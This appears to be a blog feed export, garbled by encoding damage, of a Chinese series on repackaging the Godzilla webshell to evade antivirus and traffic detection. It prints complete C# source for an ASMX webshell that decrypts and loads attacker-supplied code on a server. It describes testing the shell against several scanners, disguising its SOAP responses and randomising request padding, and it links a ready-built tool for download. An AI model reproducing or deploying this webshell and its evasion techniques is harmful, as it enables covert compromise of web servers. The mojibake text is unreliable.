ä¼šåœ¨å½“å‰åº”ç”¨ç¨‹åºåŸŸä¸­åŠ¨æ€åŠ è½½è¯¥ç¨‹åºé›†ï¼Œç±»ä¼¼äºè¿è¡Œæ—¶å°† DLL æ–‡ä»¶åŠ è½½è¿›æ¥ã€‚</li></ul><p>åœ¨åŒä¸€ä¸ªç”¨æˆ·çš„åç»­è¯·æ±‚ä¸­ï¼Œä»£ç å¯ä»¥ç›´æ¥ä» <code>Session</code> è·å–å·²ç»åŠ è½½çš„ç¨‹åºé›†ï¼Œè€Œä¸å¿…é‡å¤åŠ è½½ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126171955261.png" alt="image-20250126171955261"></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±æ”¹å¥½äº†ï¼Œè¿™æ ·å°±æ²¡æœ‰é—®é¢˜äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172311033.png" alt="image-20250126172311033"></p><p>çœ‹ä¸€ä¸‹æ˜¯å¦èƒ½ç”¨ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172336812.png" alt="image-20250126172336812"></p><p>ä½¿ç”¨èµ·æ¥ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172402151.png" alt="image-20250126172402151"></p><p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å…¶ä»–å¹³å°ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172525677-17378835258941.png" alt="image-20250126172525677"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ²³é©¬ç›´æ¥å°±ç»™æ€äº†ï¼Œè¿˜è¯†åˆ«å‡ºæ¥æ˜¯godzillaã€‚</p><p>æˆ‘ä»¬åœ¨è¿›è¡Œfuzzã€‚ç»è¿‡ç¬”è€…fuzzåï¼Œæˆ‘å‘ç°æ˜¯MD5çš„é”…ã€‚åªè¦æœ‰md5å°±æŠ¥ã€‚</p><p> string md5 = System.BitConverter.ToString(<br>                new System.Security.Cryptography.MD5CryptoServiceProvider()<br>                .ComputeHash(System.Text.Encoding.Default.GetBytes(bohemian_pass + key))<br>            ).Replace(â€œ-â€œ, â€œâ€);</p><p>åŸç‰ˆçš„æœ¨é©¬ä¸­æ˜¯åŠ è½½äº†md5çš„ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œgodzillaï¼Œåœ¨æœ¨é©¬å±‚é¢ï¼Œmd5åœ¨æœ¨é©¬ä¸­çš„ä½œç”¨ä¸»è¦æ˜¯å°†pass+keyè¿›è¡ŒMD5ï¼Œä¸Šå‡ æœŸéƒ½çŸ¥é“ï¼Œæˆ‘ä»¬æ”¹è¿‡çš„æµé‡ï¼Œä¸åœ¨è¿›è¡Œmd5åšè¯†åˆ«äº†ï¼Œæ‰€ä»¥ï¼Œä¸€ä¼šæˆ‘ä»¬å°†ä¸ä¼šç”¨åˆ°md5äº†ï¼Œç›´æ¥åœ¨æœ¨é©¬ä¸­åˆ æ‰md5å°±å¯ä»¥äº†ã€‚ä¸€ä¼šåœ¨å®šä¹‰ä¸€ä¸ªå…¶ä»–çš„ã€‚</p><p>è¯•ä¸‹æ²³é©¬</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126173336923.png" alt="image-20250126173336923"></p><p>okï¼Œè¿™æ ·å°±æ²¡é—®é¢˜äº†ã€‚</p><p>è¿™æ ·å°±å·®ä¸å¤šäº†ï¼Œæˆ‘ä»¬åœ¨ä¼˜åŒ–ä¸€ä¸‹å…¶ä¸­çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œåœ¨å…¶ä»–å¹³å°å¯èƒ½ä¸è¡Œã€‚æ¯”å¦‚payloadï¼Œæˆ–è€…ä¸€äº›å˜é‡çš„å®šä¹‰å•¥çš„ï¼Œéƒ½ç»™ä»–æ”¹æ”¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebService Language=&quot;C#&quot; Class=&quot;WebService1&quot; %&gt;</span><br><span class="line">using System;</span><br><span class="line">public class WebService1 : System.Web.Services.WebService</span><br><span class="line">&#123;</span><br><span class="line">    [System.Web.Services.WebMethod(EnableSession = true)]</span><br><span class="line">    public string asd(string asd)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder changshansi = new System.Text.StringBuilder();</span><br><span class="line">        </span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">        </span><br><span class="line">            byte[] changshangsan = System.Text.Encoding.Default.GetBytes(&quot;7815696ecbf1c96e&quot;);</span><br><span class="line">            byte[] changshangjiu = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(asd));</span><br><span class="line">            changshangjiu = new System.Security.Cryptography.AesManaged()</span><br><span class="line">                    .CreateDecryptor(changshangsan, changshangsan)</span><br><span class="line">                    .TransformFinalBlock(changshangjiu, 0, changshangjiu.Length);</span><br><span class="line">            if (Context.Session[&quot;changshangyi&quot;] == null)</span><br><span class="line">&#123;</span><br><span class="line">    AppDomain currentDomain = AppDomain.CurrentDomain;</span><br><span class="line">    byte[] changshangqi = changshangjiu;</span><br><span class="line">    System.IO.MemoryStream changshangliu = new System.IO.MemoryStream(changshangqi);</span><br><span class="line">    System.Reflection.Assembly changshangwu = currentDomain.Load(changshangliu.ToArray());</span><br><span class="line">    Context.Session[&quot;changshangyi&quot;] = changshangwu;</span><br><span class="line">&#125;else&#123;object changshanger = ((System.Reflection.Assembly)Context.Session[&quot;changshangyi&quot;])</span><br><span class="line">                            .CreateInstance(&quot;LY&quot;);</span><br><span class="line">                System.IO.MemoryStream changshangshi = new System.IO.MemoryStream();</span><br><span class="line">                changshanger.Equals(Context);</span><br><span class="line">                changshanger.Equals(changshangshi);</span><br><span class="line">                changshanger.Equals(changshangjiu);</span><br><span class="line">                changshanger.ToString();</span><br><span class="line">                byte[] r = changshangshi.ToArray();</span><br><span class="line">                string qwe = &quot;&lt;data&gt;&quot;;</span><br><span class="line">                changshansi.Append(qwe);</span><br><span class="line">                changshansi.Append(System.Convert.ToBase64String(</span><br><span class="line">                    new System.Security.Cryptography.AesManaged()</span><br><span class="line">                        .CreateEncryptor(changshangsan, changshangsan)</span><br><span class="line">                        .TransformFinalBlock(r, 0, r.Length)));</span><br><span class="line">                      changshansi.Append(qwe);  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (System.Exception)</span><br><span class="line">        &#123;</span><br><span class="line">            // Handle exceptions here (optional)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return changshansi.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯è¿™æ ·ã€‚å¯¹ä¸€äº›å­—ç¬¦ä¸²è¿›è¡Œå¯ç®€å•ä¼˜åŒ–</p><p>è¿™é‡ŒåŸç‰ˆæœ¨é©¬æœ‰ä¸€å¥<code>string bohemian_pass = &quot;asd&quot;;</code> è¿™ä¸ªä¹ä¸€çœ‹å°±æ˜¯å®šä¹‰çš„å¯†ç ï¼Œå…¶å®å…¨æ–‡è¿½ä¸‹æ¥ä¼šå‘ç°ï¼Œå¹¶æ²¡æœ‰è°ƒç”¨è¿™ä¸ªï¼Œç´¢æ€§ï¼Œä¹Ÿç»™ä»–å»æ‰äº†ã€‚</p><p>vtï¼Œå…¶å®vtå¯¹webshellç±»ä¸æ„Ÿå†’çš„ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126174824604.png" alt="image-20250126174824604"></p><p>å¾®æ­¥</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126175046630.png" alt="image-20250126175046630"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126175100822.png" alt="image-20250126175100822"></p><p>å…¶ä»–çš„ç«ç»’ 360å°±ä¸æµ‹è¯•äº†ã€‚ä¹Ÿæ²¡å•¥é—®é¢˜ã€‚</p><h5 id="asmxæµé‡ä¿®æ”¹"><a href="#asmxæµé‡ä¿®æ”¹" class="headerlink" title="asmxæµé‡ä¿®æ”¹"></a>asmxæµé‡ä¿®æ”¹</h5><p>å…æ€å·²ç»åšå®Œäº†ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯æµé‡ä¿®æ”¹äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126180015692.png" alt="image-20250126180015692"></p><p>å…ˆæ¥çœ‹ä¸€ä¸‹å•Š</p><ul><li><p><strong><code>&quot;http://tempuri.org/pass&quot;</code> çš„å«ä¹‰</strong></p><ul><li><p><strong><code>http://tempuri.org/</code></strong></p><ul><li><p>è¿™æ˜¯ä¸€ä¸ªå ä½å‘½åç©ºé—´ï¼ˆtemporary URIï¼‰ï¼Œè¡¨ç¤ºä¸´æ—¶çš„å‘½åç©ºé—´ã€‚å®ƒé€šå¸¸ç”¨äºé»˜è®¤çš„ Web æœåŠ¡é¡¹ç›®ï¼Œè¡¨ç¤ºå°šæœªå®šä¹‰ç‰¹å®šçš„å‘½åç©ºé—´ã€‚</p></li><li><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåº”æ›¿æ¢ä¸ºç‰¹å®šçš„å‘½åç©ºé—´ï¼Œå¦‚ï¼š<br><code>http://example.com/myservice</code> æˆ–å…¶ä»–è§„èŒƒçš„ URIã€‚</p></li></ul></li></ul></li></ul><p>è¿™ä¸ªæ˜¯å¿…é¡»çš„ï¼Œä¸‹é¢ä¼ é€’çš„å‚æ•°å‘¢å°±æ˜¯xmlæ ¼å¼çš„ï¼Œå³è¾¹æ˜¯è¿”å›çš„æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°å·¦å³è¿½åŠ çš„md5 16ä½ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163o8tM0853zU1IMnDChC5Kz8LDfyvxkgvjI4biZcqE8CaljtGledXoE+blv/pYFFNZ6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p>æœ¬æ¥è®¡åˆ’è€…åšæˆä¸‹é¢è¿™æ ·çš„ï¼Œå°±æ˜¯å°†16å­—ç¬¦ä¸²æ›¿æ¢ä¸º<data></data>,è¿™æ ·ä¼ªè£…ä¸€ä¸‹ã€‚ä½†æ˜¯æ²¡æˆåŠŸï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;&lt;data&gt;o8tM0853zU1IMnDChC5Kz8LDfyvxkgvjI4biZcqE8CaljtGledXoE+blv/pYFFNZ&lt;/data&gt;&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126181040305.png" alt="image-20250126181040305"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å°†dataå†™å¥½ä¹‹åã€‚<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126181158838.png" alt="image-20250126181158838"></p><p>å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°å°±æ˜¯ï¼Œè¿”å›çš„&lt;&gt; éƒ½è¢«è½¬ä¹‰äº†ã€‚å¥ˆä½•ç¬”è€…å¤ªèœäº†ï¼ŒæŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ï¼Œéƒ½æ²¡å‘€å°†å°–æ‹¬å·å°±è°ƒæ•´è¿‡æ¥ã€‚ä¸è¿‡è¿™æ ·çœ‹ï¼Œä¹Ÿçœ‹ä¸å‡ºæ¥åé¢çš„=äº†ã€‚<code>&lt;soap:Body&gt;&lt;asdResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;asdResult&gt;&amp;lt;data&amp;gt;pKbveI07Gojru9gjm3HZ2nDxmEBZAUIUH0ifaEX3JQI=&amp;lt;data&amp;gt;&lt;/asdResult&gt;&lt;/asdResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></p><p>å…¶å®ä½ çœ‹è¿™ä¸ªè¿”å›åŒ…ï¼Œå…¶ä¸­è¿™ä¸ªæœ€åçš„=åƒbase64ï¼Œä½†æ˜¯ï¼Œå½“<data></data>,è¿›è¡Œurlå®ä½“ç¼–ç åï¼Œä¹Ÿå¥½çœ‹ä¸€ç‚¹äº†ã€‚å…¶å®ä¸»è¦è¿˜æ˜¯å°†åŸæ¥çš„16ä½å»é™¤æ‰ï¼Œç®€å•æ··æ·†ä¸€ä¸‹ã€‚</p><p>å¥½ï¼Œæˆ‘ä»¬è¿™é‡Œæµé‡å°±å…ˆè¿™æ ·ã€‚å¥ˆä½•ç°åœ¨ç¬”è€…è¿™é‡Œæ²¡æœ‰å®‰å…¨è®¾å¤‡ï¼Œä¹Ÿæ²¡æœ‰åŠæ³•å»è¯•è¯•æ˜¯å¦å…æ€ï¼Œè¿˜å¸Œæœ›å¤§å®¶åœ¨ä½¿ç”¨åï¼Œå°†æ•ˆæœå‘Šè¯‰ç¬”è€…ï¼Œå’±ä»¬åœ¨åšæ”¹è¿›ã€‚</p><h5 id="asmxå…æ€æœ¨é©¬ç”Ÿæˆ"><a href="#asmxå…æ€æœ¨é©¬ç”Ÿæˆ" class="headerlink" title="asmxå…æ€æœ¨é©¬ç”Ÿæˆ"></a>asmxå…æ€æœ¨é©¬ç”Ÿæˆ</h5><p>å¥½ï¼Œæ¥ä¸‹æ¥å°†æˆ‘ä»¬çš„å…æ€å°è£…åˆ°godzillaä¸­ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126183223375.png" alt="image-20250126183223375"></p><p>å…ˆåšshellä¿®æ”¹ï¼Œç®€å•ä¿®æ”¹ä¸€ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126190855167.png" alt="image-20250126190855167"></p><p>shellæ¨¡æ¿ä¹Ÿæ›¿æ¢ä¸€ä¸‹ï¼Œ<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126190914539.png" alt="image-20250126190914539"></p><p>å¥½ï¼Œæ¥ä¸‹æ¥ï¼Œbuild projectï¼Œbuild artifactsã€‚</p><p>å¤§å®¶åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œasmxçš„æœ¨é©¬åœ¨cshapä¸­,<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192127888.png" alt="image-20250126192127888"></p><p>ç‚¹å‡»ç”Ÿæˆå³å¯ï¼Œè¿˜æ˜¯æ¨èå¤§å®¶åˆ«ç”¨é»˜è®¤å£ä»¤åŠå¯†ç ã€‚</p><p>ç”Ÿæˆä¸‰ä»½</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192722085.png" alt="image-20250126192722085"></p><p>éƒ½ä¸ä¸€æ ·ï¼Œæ²¡å•¥é—®é¢˜ã€‚çœ‹ä¸‹èƒ½ä¸èƒ½ç”¨ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192759491.png" alt="image-20250126192759491"></p><p>å¤§å®¶ä½¿ç”¨çš„æ—¶å€™ï¼Œé€‰æ‹©<code>CShapDynamicPayload-&gt;CSHAP_ASMX_AES_BASE64_DATA</code>å³å¯ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126193203603.png" alt="image-20250126193203603"></p><p>ä½¿ç”¨èµ·æ¥ä¹Ÿæ˜¯æ²¡å•¥é—®é¢˜ã€‚å¥½ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å·®ä¸å¤šæ”¹å®Œäº†ã€‚</p><p>ä¸Šé¢æåˆ°æ¨èå¤§å®¶åˆ«ç”¨é»˜è®¤å¯†é’¥åŠå¯†ç æˆ–è€…å°†å¯†ç å¯†é’¥è®¾ä¸ºä¸€æ ·çš„ã€‚è¿™é‡Œè¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆï¼Œå°±æ˜¯æˆ‘ä»¬è®¿é—®æœ¨é©¬çš„æ—¶å€™ï¼Œå…¶å®æ˜¯å¯ä»¥çœ‹åˆ°å¯†ç ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126194700390.png" alt="image-20250126194700390"></p><p>å°±æ˜¯è¿™ä¸ªï¼Œå‚æ•°ï¼Œå…¶å®è¿™é‡Œå°±æ˜¯å¯†ç ï¼Œä½†ä¸æ˜¯å¯†é’¥ï¼ˆkeyï¼‰ã€‚å¦‚æœåˆ«è®¿é—®åˆ°äº†ï¼Œå»çŒœä½ çš„å¯†é’¥ï¼Œä½ è®¾ç½®å¾ˆç®€å•ï¼Œæˆ–è€…å’Œå¯†ç ç›¸åŒï¼Œé‚£ä¹ˆä½ è¾›è¾›è‹¦è‹¦æ‰“çš„ç«™å°±è¢«åˆ«äººä¸Šè½¦äº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æœ¬æ–‡å¯¹godzillaä¸­asmxæœ¨é©¬è¿›è¡Œå…æ€ï¼ŒåŠæµé‡ä¿®æ”¹è¿›è¡Œç®€å•å…æ€ï¼Œå°†å…æ€æœ¨é©¬å°è£…åˆ°godzillaä¸­ï¼Œä½¿ç”¨æ¨¡æ¿è¿›è¡Œå…æ€ï¼Œè¾¾åˆ°æ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬éƒ½ä¸ç›¸åŒã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>1.1ç‰ˆæœ¬æ·»åŠ æœ¨é©¬çš„å…æ€ï¼Œå…¨è¯­è¨€éƒ½åšå¥½äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ã€‚</p><p>1.2ç‰ˆæœ¬åšäº†åŠ¨æ€å¯†é’¥ã€‚</p><p>1.3ç‰ˆæœ¬åšäº†å·¦å³åŠ¨æ€æ·»åŠ æ•°æ®ï¼Œ</p><p>1.4ç‰ˆæœ¬åšäº†asmxåŠ¨æ€å…æ€åŠæµé‡ä¿®æ”¹ã€‚</p><p>åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è¿˜æœ‰å°±æ˜¯messageå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚</p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            åŸç‰ˆå“¥æ–¯æ‹‰</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> äºŒå¼€ </tag>
            
            <tag> asmxå…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-4(æµé‡ä¼˜åŒ–)</title>
      <link href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/"/>
      <url>/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>ä¸Šé¢çš„æ–‡ç« åšäº†åŠ¨æ€çš„å…æ€ï¼Œä»¥åŠåŸºäºæ—¶é—´çš„å¯†é’¥åŠ¨æ€å¤„ç†ï¼Œè¿˜æŒºå¥½çš„ï¼Œè¿˜æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿å¯ä»¥åšæˆåŠ¨æ€çš„ï¼Œæˆ‘æƒ³äº†æƒ³ï¼Œè¿˜å¯ä»¥æŠŠuaæˆ–è€…ä»¥å‰è®¡åˆ’ä¸­å®ç°çš„æ•°æ®åŒ…å·¦å³è¿½åŠ ç»™åŠ¨æ€å®ç°ä¸€ä¸‹ã€‚</p><h5 id="æ•°æ®è¿½åŠ "><a href="#æ•°æ®è¿½åŠ " class="headerlink" title="æ•°æ®è¿½åŠ "></a>æ•°æ®è¿½åŠ </h5><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171238054.png" alt="image-20250122171238054"></p><p>é»˜è®¤æˆ‘ä»¬æ‰“å¼€å“¥æ–¯æ‹‰æ˜¯ä¸å·¦å³è¿½åŠ æ•°æ®çš„ã€‚å‰å‡ ä¸ªç‰ˆæœ¬éƒ½å·¦è¾¹åŠ äº†page=1&amp;size=10å³è¾¹è¿½åŠ äº†&amp;Name=managerï¼Œè¿™æ¬¡æˆ‘ä»¬è®©ä»–åŠ¨èµ·æ¥ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171359220.png" alt="image-20250122171359220"></p><p>åœ¨core\ui\component\frame\ShellSetting.javaä¸‹æœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.leftTextArea.setText(<span class="string">&quot;page=1&amp;size=10&amp;&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.rightTextArea.setText(<span class="string">&quot;&amp;Name=manager&quot;</span>);</span><br></pre></td></tr></table></figure><p>éƒ½æ˜¯ç”¨æ¥è®¾ç½®çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªå˜é‡è®©ä»–åŠ¨èµ·æ¥ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171548157.png" alt="image-20250122171548157"></p><p>ç®€å•å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¸¸ç”¨çš„é”®å€¼ï¼Œç„¶åå°±æ˜¯å€¼ï¼Œæˆ‘ä»¬é‡‡ç”¨éšæœºç”Ÿæˆä¸€ä¸ªä¸¤ä½æ•°å­—ï¼Œå°±ä¼šæ˜¯å¤§æ¦‚cartid=12è¿™æ ·ï¼Œæ¥ç€ï¼Œå°†æ‰€æœ‰çš„é”®å€¼å¯¹ç»™åˆ°ä¸€ä¸ªåˆ—è¡¨ï¼Œç„¶åå†éšæœºæŠ½é€‰å‡ ä¸ªé”®å€¼å¯¹ã€‚</p><p>çœ‹ä¸‹æ•ˆæœã€‚<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171927650.png" alt="image-20250122171927650"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171936053.png" alt="image-20250122171936053"></p><p>page=33&amp;quantity=51&amp;size=47&amp;orderid=21&amp;status=63&amp;productname=78&amp;</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171959443.png" alt="image-20250122171959443"></p><p>page=47&amp;quantity=5&amp;size=84&amp;brand=67&amp;</p><p>size=17&amp;orderid=4&amp;</p><p>è¿™æ ·æ¯æ¬¡æ·»åŠ 